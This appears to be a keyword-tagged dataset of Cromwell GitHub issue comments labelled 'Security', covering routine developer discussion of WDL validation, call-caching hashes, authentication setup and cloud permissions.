Security,"@mwalker174 originally reported:. > Hi all, I’ve got a critical problem where call caching times out on a particular WDL task (`“message”: “Hashing request timed out for gs://...“’). This makes some sense since the task is checking ~200 files on each of ~200 shards. This is on cromwell v36/papiv2. I thinking bundling the files would probably fix this, but is there any way to increase the timeout limit in the server settings? Would upgrading to v38 help? Thanks!. There's currently a non-configurable 5 minute timeout per GCS hash request. Assuming no batching (which I didn't come across) for ~40K individual requests that's about 100 requests/second to GCS. I'm pretty sure w/ GCS request throttling & internal cromwell backoffs at least one of those requests would fail to return in 5 minutes.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4873:140,Hash,Hashing,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4873,2,"['Hash', 'hash']","['Hashing', 'hash']"
Security,@nvanaja I re-verified your permissions and they look right. I am noticing that Git is using `https://github.com/broadinstitute/cromwell.git/'` as the remote; using an HTTPS remote does not use your SSH keys for authentication and could be causing the problem. I always recommend SSH remotes e.g. `git@github.com:broadinstitute/cromwell.git`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760536657:212,authenticat,authentication,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760536657,1,['authenticat'],['authentication']
Security,"@orodeh it looks like the `WdlStandardLibraryFunctionsType#flatten` method was missing, which meant Cromwell wasn't able to validate workflows with `flatten`s in them. I also added the coercion so that `flatten(_: Array[Map[_]])` works as expected.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2959:124,validat,validate,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2959,1,['validat'],['validate']
Security,"@orodeh yeah, I wouldn't worry about that (it sounds like a hash was changed in quay.io for the first time in 2 years and it broke that test. Nothing for us to worry about in this PR!). I'll wait for the tests to complete again and as long as it's still looking good, I'll merge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370594386:60,hash,hash,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370594386,1,['hash'],['hash']
Security,"@pgrosu It's in our internal space, however I can give you the gist. We're doing a few things at once ...; - Make workflow submission async. Submitted workflows go into a new store and the WorkflowManagerActor can pull them as necessary. Within the store they'll be marked as either Submitted, Running or Restartable. The latter is a state which is assigned to any workflow in Running state when the system comes online; - The EngineJobExecutionActor (EJEA above) sits between the WorkflowExecutionActor and the BackendJobExecutionActor, and will manage engine-side knowledge in a persisted store. The combination of this and the above will allow us to bring back what we call the 'restart' functionality - i.e. pick up a running workflow from the engine side but not reattach to running backend jobs; - Less hashed out at the moment, if a backend will support 'recover' functionality (attaching to the backend jobs, we'll implement this in as many of our own backends as we can), the backend will need to manage its own information, e.g. using the KV store",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714:809,hash,hashed,809,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714,1,['hash'],['hashed']
Security,"@prihoda . miniwdl has a [little CLI wrapper](https://github.com/chanzuckerberg/miniwdl#miniwdl-cromwell) to make it nicer to launch cromwell locally. It doesn't do the the shebang script which is a neat idea, however, it does implement versions of (i) parsing the task/workflow inputs to expose them as command-line arguments, and (ii) parsing the outputs to organize them more nicely after they come out. [Here is a link](https://github.com/chanzuckerberg/miniwdl/blob/b7f399b56ad2f01ed9867e6105c036a251c4ae73/WDL/CLI.py#L289) to the CLI entrypoint for this where you can see how all this happens. I'd be happy to work with you on merging & fleshing out the ideas.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5029#issuecomment-501874278:289,expose,expose,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5029#issuecomment-501874278,1,['expose'],['expose']
Security,"@pshapiro4broad commented on [Tue Aug 01 2017](https://github.com/broadinstitute/wdltool/issues/36). We would like to automate the process of validating a JSON input file against our WDL. Using the `inputs` command is helpful but it would be even easier to use for validation if `wdltool` had a command that generates the JSON schema for the inputs. The format for a JSON schema is here: http://json-schema.org/. ---. @geoffjentry commented on [Tue Aug 01 2017](https://github.com/broadinstitute/wdltool/issues/36#issuecomment-319471781). Not a comment on the actual topic but just a heads up that the `wdltool` repo is one of the dustiest corners in terms of developer attention :). Also since `wdltool` is really just a command line wrapper around `wdl4s`, really any functionality request would involve a ticket there, might be more efficient to cut out the middle man and go there w/ these requests.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2882:142,validat,validating,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2882,2,['validat'],"['validating', 'validation']"
Security,"@rhpvorderman great comment, I don't think there's an especially nice workaround to this right now. This is caused because `defined` operates on optional values (eg `File?`) whereas object member accesses either returns a value, or fail the workflow. We could fix this in a couple of ways:. - Change member access to always return optional values. This would have the side effect of forcing subsequent usages to handle the optional result even if you know the object has that key.; - Add a `hasKey(object, key)` method for objects, roughly equivalent to how you're trying to use `defined`. ; - Maybe adding a `getPath(object, path)` method that returns an optional value which is set if the path exists in the object, or empty if it isn't. And with my apologies, I'm now going to immediately redirect you elsewhere... Since any of the above suggestions would require a change to the [WDL spec](https://github.com/openwdl/wdl), I suggest you open this as a new issue in that repo. Once the change is accepted there I'll be able to make a new issue here to implement the change in Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3093#issuecomment-359959967:196,access,accesses,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3093#issuecomment-359959967,2,['access'],"['access', 'accesses']"
Security,"@ruchim @cjllanwarne that's correct. We deserialize the response from Martha into [these](https://github.com/broadinstitute/cromwell/blob/26c5bbf007f81ab9604109ce46063b85e3ac0586/cloud-nio/cloud-nio-impl-drs/src/main/scala/cloud/nio/impl/drs/DrsPathResolver.scala#L81-L90) case classes. Currently, even though Martha accepts `drs://` uuids, the response we get back from Martha contains a key called `dos: {...}` within which lies our gs urls, size, checksum, etc. Hence the object can still be called `DosObject`. For example if you curl to Martha with a uuid `drs://path-here` it would respond back with a response os structure to ; ```; {; ""dos"": {; ""data_object"": {; ""id"": ""...."",; ""urls"": [; {; ""url"": ""https://url""; },; {; ""url"": ""gs://url""; }; ],; ""size"": ""123"",; ""checksums"": [; {; ""checksum"": ""123"",; ""type"": ""sha256""; }; ],; ""aliases"": [; ""some-alieas""; ],; ""version"": ""2019-07-04T104122.106166Z"",; ""name"": ""name-of-file""; }; },; ""googleServiceAccount"": {; ......; }; }; ```; where the metadata information lies in `dos` key.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5149#issuecomment-526649237:450,checksum,checksum,450,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5149#issuecomment-526649237,3,['checksum'],"['checksum', 'checksums']"
Security,"@ruchim Thanks for the update. I can find a workaround, e.g. reducing the number of exposed outputs; it's just that this will affect others using the same workflow on e.g. DNAnexus . If I try to make a PR myself, based on what's done for AWS_CROMWELL_INPUTS_GZ, do you think you'd be able to look at it?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-445982069:84,expose,exposed,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-445982069,1,['expose'],['exposed']
Security,"@ruchim commented on [Fri Aug 11 2017](https://github.com/broadinstitute/wdl4s/issues/168). The wdl docs say that when using the true/false syntax in the command block, one can get away with declaring just one of the 2, however the WDL fails validation and fails to create a namespace and therefore never gets run. . AC:; Actually allow being able to declare True or False and statements OR Keep enforcing that both the behavior for true/false need to be defined, and adjust that expectation in the docs accordingly. https://github.com/broadinstitute/wdl/blob/develop/SPEC.md#true-and-false",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2713:242,validat,validation,242,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2713,1,['validat'],['validation']
Security,"@ruchim commented on [Thu Aug 24 2017](https://github.com/broadinstitute/wdltool/issues/46). When validating the workflow below with wdltool-0.14.jar, the response is simply ""null"". . ```; workflow w {; String s = ""test"". output {; String o =; }; }; ```; It would be great if a more comprehensive error is returned in the case of invalid workflow outputs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2883:98,validat,validating,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2883,1,['validat'],['validating']
Security,"@ruchim commented on [Wed May 24 2017](https://github.com/broadinstitute/wdltool/issues/29). Given a task:. task myTask {; File f; command {; touch ${f.bam.bai}; }; }. A workflow with such a task validates in wdltool-0.10 but when run on cromwell-26, it fails with an error: java.lang.UnsupportedOperationException: Could not evaluate expression:.... Given a slightly altered version of that previous task:. task myTask {; File f; command {; touch ${f%%.bam.bai}; }; }. This task also validates but fails before the Workflow is about to run with the error: scala.MatchError: null. ---. @geoffjentry commented on [Wed May 24 2017](https://github.com/broadinstitute/wdltool/issues/29#issuecomment-303819742). Is this an artifact of wdltool being out of synch? it happens way too often :(",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2873:196,validat,validates,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2873,2,['validat'],['validates']
Security,"@ruchim turned on file hash caching, which solved the problem for us.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4873#issuecomment-486795661:23,hash,hash,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4873#issuecomment-486795661,1,['hash'],['hash']
Security,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:1082,validat,validateWorkflowIdInMetadata,1082,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053,1,['validat'],['validateWorkflowIdInMetadata']
Security,"@samanehsan there is a problem here (maps that are made using `String`s and `Int`s should evaluate to `Map[X, String]` rather than `Map[X, Int]`, but in your case the real problem is you're using `Map`s to instantiate `Object`s - which is much nicer to do using the object literal syntax. In your example:. ```wdl; other_inputs = [; object {; name: ""sample_id"",; value: GetInputs.sample_id; },; object {; name: ""reference_name"",; value: reference_name; },; object {; name: ""transcriptome_tar_gz"",; value: transcriptome_tar_gz; },; object {; name: ""expect_cells"",; value: expect_cells; }; ]; ```. This has the added bonus when you switch to WDL 1.0 and start using `struct`s that we can type-check that your object instantiations have the correct set of fields at validation time (we can't do that with map => object coercions)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4131#issuecomment-427505754:763,validat,validation,763,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4131#issuecomment-427505754,1,['validat'],['validation']
Security,"@scottfrazer @francares @geoffjentry @kcibul . The choice of Develop was deliberate. If we review these changes vs master we'll only give ourselves a false sense of security w.r.t the real state of the merge. As I said before, I'm most worried about the divergence between our two branches, not just the implementation diff between this branch and Master. Personally I would address any existing comments and close this version of the PR. But whichever way we go, I recommend against leaving 2 PRs open for the same change at the same time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174210135:165,secur,security,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174210135,1,['secur'],['security']
Security,@scottfrazer See: ; def getExecutionsWithResuableResultsByHash(hash: String): Future[Traversable[Execution]],MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/278#issuecomment-155148633:63,hash,hash,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/278#issuecomment-155148633,1,['hash'],['hash']
Security,"@seandavi ; I SSH'd into the compute environment and was able to copy files into the cromwell executions bucket. Though something weird seems to be going on with the authentication because the instance appears to have write permissions for all the s3 buckets in the region, which appears to be due to the AmazonEC2RoleforSSM policy attached to the instance IAM:. ```; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssm:DescribeAssociation"",; ""ssm:GetDeployablePatchSnapshotForInstance"",; ""ssm:GetDocument"",; ""ssm:GetManifest"",; ""ssm:GetParameters"",; ""ssm:ListAssociations"",; ""ssm:ListInstanceAssociations"",; ""ssm:PutInventory"",; ""ssm:PutComplianceItems"",; ""ssm:PutConfigurePackageResult"",; ""ssm:UpdateAssociationStatus"",; ""ssm:UpdateInstanceAssociationStatus"",; ""ssm:UpdateInstanceInformation""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssmmessages:CreateControlChannel"",; ""ssmmessages:CreateDataChannel"",; ""ssmmessages:OpenControlChannel"",; ""ssmmessages:OpenDataChannel""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2messages:AcknowledgeMessage"",; ""ec2messages:DeleteMessage"",; ""ec2messages:FailMessage"",; ""ec2messages:GetEndpoint"",; ""ec2messages:GetMessages"",; ""ec2messages:SendReply""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""cloudwatch:PutMetricData""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2:DescribeInstanceStatus""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ds:CreateComputer"",; ""ds:DescribeDirectories""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""logs:CreateLogGroup"",; ""logs:CreateLogStream"",; ""logs:DescribeLogGroups"",; ""logs:DescribeLogStreams"",; ""logs:PutLogEvents""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""s3:GetBucketLocation"",; ""s3:PutObject"",; ""s3:GetObject"",; ""s3:GetEncryptionConfiguration"",; ""s3:AbortMultipartUpload"",; ""s3:ListMultipartUploadParts"",; ""s3:ListBucket"",; ""s3:ListBucketMultipartUploads""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292:166,authenticat,authentication,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292,1,['authenticat'],['authentication']
Security,"@sfrazet on all of your comments revolving around the references to a validation change, early on @mcovarr asked me to clean something up which appeared to be small. It turned out to be neither small nor did it play well with the call caching branch in terms of rebasing. Instead what I'm doing is taking those changes as a separate branch off if the call caching work with the intention of merging it immediately after CC is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/323#issuecomment-164773421:70,validat,validation,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/323#issuecomment-164773421,1,['validat'],['validation']
Security,"@tlangs I think the best answer may be to change the [directoryResolver](https://github.com/broadinstitute/cromwell/blob/develop/languageFactories/language-factory-core/src/main/scala/cromwell/languages/util/ImportResolver.scala#L33) to allow us to customize the ""don't escape the directory"" validation when womtool calls it only, ie:; ```scala; def directoryResolver(directory: Path, allowEscapingDirectory: Boolean = false) = { ; ...; if (absolutePathToFile.startsWith(absolutePathToImports) || allowEscapingDirectory) {; ...; } else {; ...; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401428709:292,validat,validation,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401428709,1,['validat'],['validation']
Security,"@tmdefreitas I observed/experienced a similar issue. I had a WDL with an optional input. It was optional because its type was ""File?"". I was passing in the input when issuing a submission on FireCloud which is currently using v0.24 of Cromwell according to the launch config dialog box. Using the developer tab I saw the error . ```; ""failures"": [{; ""message"": ""Couldn't resolve all inputs for CallingGroup_Workflow.CallSomaticMutations_131_Prepare_Task at index None.: Input evaluation for Call CallingGroup_Workflow.CallSomaticMutations_131_Prepare_Task failed.:\n\tnormalPanelSize:\n\tFile not found fc-2edc2716-272a-438a-b458-25dbee1e253d/eb1f9669-ce6c-462d-950d-630b321ddc1f/CallingGroup_Workflow/096768d6-9e90-4d1d-81c7-f909559a1a55/call-CallSomaticMutations_131_Prepare_Task/\""gs:/firecloud-tcga-open-access/tutorial/reference/refseq_exome_10bp_hg19_300_1kg_normal_panel.vcf\""""; }],; ```. I note two things. First, I note as I mentioned that I was passing in the file and so the error ""File Not found"" does not make sense. Second, I note that the gsURL has only one ""/"" after the ""gs"" ; in contrast the file IS where it is and in the workspace attribute (where it is pulled from) it is there and the file preview worked. Also the gsURL in the workspace had two ""//"" as it should. To be able to successfully use the WDL I removed the ""?"" so that it's a plain ""non-optional"" input. After removing the ""?"" I was able to successfully run the WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1937#issuecomment-276756241:808,access,access,808,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1937#issuecomment-276756241,1,['access'],['access']
Security,"@tmdefreitas commented on [Tue Mar 22 2016](https://github.com/broadinstitute/wdltool/issues/7). I came across this while helping a colleague debug her WDL file. When this WDL file is validated, wdltool claims an ""Error: finished parsing without consuming all tokens"", even though the error is commented out:. ```; task comment_bug {; #String an_input. command {; echo ""Alternate command""; # The following line has a WDL syntax error, but in a comment!; #echo {an_input} ; }. output {. }; }. workflow test {; call comment_bug; }; ```. EDIT: error message, for completeness:. ```; $ java -jar wdltool.jar validate comment_bug.wdl; ERROR: Finished parsing without consuming all tokens. output {; ^; ```. I can get rid of the error by changing the comment line to `#echo ${an_input}`. ; I think errors in comment lines should probably be ignored by the validator. As an aside, is there a more helpful error message for this? The message sounds like an unused input variable or something, not that the bracket syntax was off, so it was hard to diagnose (The above is a toy example, the real task had a much more complicated command). ---. @scottfrazer commented on [Wed Mar 23 2016](https://github.com/broadinstitute/wdltool/issues/7#issuecomment-200416975). This is happening because the the `command {...}` section is parsed differently than the rest of WDL. The parser thinks that the closing brace in `#echo {an_input}` is actually trying to close the `command` section. If you use the alternative delimiters (`command <<< ... >>>`) this is another way to get around it. We parse the command as ""opaque strings intermixed with `${...}` blocks"". That means that the `#`-style comments inside a command section are not interpreted as WDL comments, but instead as part of the command. More thought would have to go into figuring out what the right thing to do here is. ---. @tmdefreitas commented on [Wed Mar 23 2016](https://github.com/broadinstitute/wdltool/issues/7#issuecomment-200442613). Admittedly",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2870:184,validat,validated,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2870,3,['validat'],"['validate', 'validated', 'validator']"
Security,"@tmdefreitas commented on [Tue Mar 29 2016](https://github.com/broadinstitute/wdltool/issues/8). In the following WDL, **GSEA_v_1_0_fwer_p_val_threshold** was not declared as an input, but the validator didn't raise an error. Cromwell choked when trying to run the task. Is there a reason wdltool shouldn't throw an error here?. ```; task tool_gsea_mrnaseq_subtypes {; String outputprefix; String pheno_from_aggregate_molecular_subtype_clusters; String pheno_name; File tcga_pheno_FileName; File tcga_exp_FileName; File gs_db; String GSEA_v_1_0_reshuffling_type; String GSEA_v_1_0_nperm; String GSEA_v_1_0_weighted_score_type; String GSEA_v_1_0_nom_p_val_threshold; String GSEA_v_1_0_topgs; String GSEA_v_1_0_adjust_FDR_q_val; String GSEA_v_1_0_gs_size_threshold_min; String GSEA_v_1_0_gs_size_threshold_max; String GSEA_v_1_0_reverse_sign; String GSEA_v_1_0_perm_type. command {; /R/RunR.sh -f main /src/Pathway_GSEA.R --libdir/src --disease_type${outputprefix} --pheno.from.Aggregate_Molecular_Subtype_Clusters${pheno_from_aggregate_molecular_subtype_clusters} --pheno.name${pheno_name} --tcga.pheno.FileName${tcga_pheno_FileName} --tcga.exp.FileName${tcga_exp_FileName} --gs.db${gs_db} --GSEA.v.1.0.reshuffling.type${GSEA_v_1_0_reshuffling_type} --GSEA.v.1.0.nperm${GSEA_v_1_0_nperm} --GSEA.v.1.0.weighted.score.type${GSEA_v_1_0_weighted_score_type} --GSEA.v.1.0.nom.p.val.threshold${GSEA_v_1_0_nom_p_val_threshold} --GSEA.v.1.0.fwer.p.val.threshold${GSEA_v_1_0_fwer_p_val_threshold} --GSEA.v.1.0.fdr.q.val.threshold${GSEA_v_1_0_fdr_q_val_threshold} --GSEA.v.1.0.topgs${GSEA_v_1_0_topgs} --GSEA.v.1.0.adjust.FDR.q.val${GSEA_v_1_0_adjust_FDR_q_val} --GSEA.v.1.0.gs.size.threshold.min${GSEA_v_1_0_gs_size_threshold_min} --GSEA.v.1.0.gs.size.threshold.max${GSEA_v_1_0_gs_size_threshold_max} --GSEA.v.1.0.reverse.sign${GSEA_v_1_0_reverse_sign} --GSEA.v.1.0.perm.type${GSEA_v_1_0_perm_type}. zip -r ${outputprefix}.pathway_gsea_mrnaseq_subtypes.zip . ; }. output {; File zip_results=""${outputprefix}.pat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2874:193,validat,validator,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2874,1,['validat'],['validator']
Security,"@vdauwera I spotted the issue but it was @kshakir who ended up resolving it. I believe this had to do with the auth that was used to perform the read_* function, and not having access to the proper google credentials. I checked the [config](https://github.com/googlegenomics/pipelines-api-examples/blob/master/wdl_runner/cromwell_launcher/jes_template.conf) wdl_runner uses and I believe it's missing the goolge.auths key and the engine.filesystem.gcs.auth key in the config, which is probably what Cromwell requires to parse gcs files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165:177,access,access,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165,1,['access'],['access']
Security,"@vdauwera commented on [Mon Apr 24 2017](https://github.com/broadinstitute/dsde-docs/issues/1996). Need to put in a Cromwell ticket for this. Basic ask: have Cromwell automatically look for (and co-localize) accessory files when given files with a specific extensions. E.g. if I give it foo.bam file it should look for foo.bai. . Note that sometimes it's just a matter of swapping the extension, but sometimes it's adding another extension, and there can be multiple accessory files, e.g. reference.fasta is always accompanied by both reference.fasta.fai and reference.dict. . This would ideally be configurable by the Cromwell admin, who would set up a list of primary file extensions and their accessory file naming patterns. Bonus points if the user can provide their own config on the command line to override the server's config. And also I want a pet unicorn that farts glitter. ----. WDL folks;; This is a followup from a recent discussion about getting compatible bcbio generated WDL (http://gatkforums.broadinstitute.org/wdl/discussion/9257/object-attribute-access-and-secondary-index-files). Thanks to all the great help you've provided we now have compatible WDL output that passes validation:. https://github.com/bcbio/test_bcbio_cwl/blob/master/run_info-cwl-wdl. This is brilliant, and I'd like to move into testing runs with Cromwell. Before starting this, there is one major area I know we're missing in the conversion, handling of secondary files and directories of files. CWL has the notion of secondaryFiles (http://www.commonwl.org/v1.0/Workflow.html#File) which you can use to block these and ensure they get staged/run next to each other. I use this in bcbio and wanted to figure out the best way to map it into WDL. There are two cases we use these for:. - Index files associated with compressed inputs, like BAM bai indices and bgzip VCF tbi indices. These are a single index file attached to the original file that should get staged in the same directory when running.; - Direc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269:208,access,accessory,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269,3,['access'],['accessory']
Security,"@vdauwera is this a use case for #2652, add a validation endpoint?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332205964:46,validat,validation,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332205964,1,['validat'],['validation']
Security,"@vsoch Thanks for testing this! This was indeed a major oversight on my behalf. . I did some further testing:. + It does not matter if you use a hashed container. Singularity will still look it up on the internet.; + The singularity cache does not store the file in an easily retrievable way:. ```; ~/.singularity/cache/oci-tmp/7c7e798af52365c2fa3c1c4606dcf8c1e2d5e502f49f1185d774655648175308$ ls; fastqc_0.11.9--0.sif fastqc@sha256_319b8d4eca0fc0367d192941f221f7fcd29a6b96996c63cbf8931dbb66e53348.sif; ```; You would have to hack with find etc. Dammit, this means this solution only works for fully connected nodes. And it means an alternate (more robust) solution needs to be hacked together in bash :scream: . On the other hand, I feel this could be fixed easily by singularity having a `--use-cache-first` flag, so it checks the cache first instead of checking the internet. I will investigate what is possible upstream.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498:145,hash,hashed,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498,1,['hash'],['hashed']
Security,"@vsoch That's a fair point. I was thinking that as there were viable config blocks in the new documentation that perhaps it's not necessarily, but I think we want **something** in `cromwell.examples.conf`. Thinking about it a little bit tho it winds up coming back to an issue I kept punting where I didn't want to add a bunch of variants for the different common situations. . Would it make sense to you if there was a comment block in there pointing people to the tutorial for examples? If so I'm happy to do that. If you think it's best to leave the concrete example(s), could you please confirm that they're consistent with the config files you all hashed out in #4635?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468830676:653,hash,hashed,653,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468830676,1,['hash'],['hashed']
Security,"@wholtz unfortunately, I no longer work a the Broad Institute and cannot help you gain access to the cromwell Jira project. @aednichols should be able to help or connect you with someone who can.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097067077:87,access,access,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097067077,1,['access'],['access']
Security,"@wleepang @markjschreiber . I also ran into this issue on several workflows that each ran for 28 hours before failing. Similar to XLuyu, it was in a scattered task. I can't access the logs for the server which failed because Batch terminated it. I suspect that something happened while provisioning the server... through the UserData: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Under that assumption, the fetch_and_run script would have never been installed to the correct location, but the job continued to execute. I see that in some places, you have checks for things such as when the awscli fails to install, then the machine is shutdown. https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Perhaps there should be a validation step to ensure that the machine is correctly provisioned? Alternatively, is it possible to `set -e` directly in the UserData runcmd? I see that `set -e` is set within some scripts, such as `provision.sh`: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/ecs-additions/provision.sh#L3. Another thought... I see that in the UserData script, there are some calls out to the network. Would it make sense to set AWS_RETRY_MODE=adaptive in such cases to help protect against random network failures?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341:173,access,access,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341,2,"['access', 'validat']","['access', 'validation']"
Security,"@yfarjoun @meganshand If I point you to a cromwell branch that might fix this problem, is this something you could easily test ?; I did some testing on my own and it's definitely better but hard to tell if it would really solve this without actually testing it for real.; If the answer is ""you can run this WDL yourself and check"" that's also fine. Just need to have access to all the inputs (and figure out how to get permission to run something on SGE..)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288849829:367,access,access,367,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288849829,1,['access'],['access']
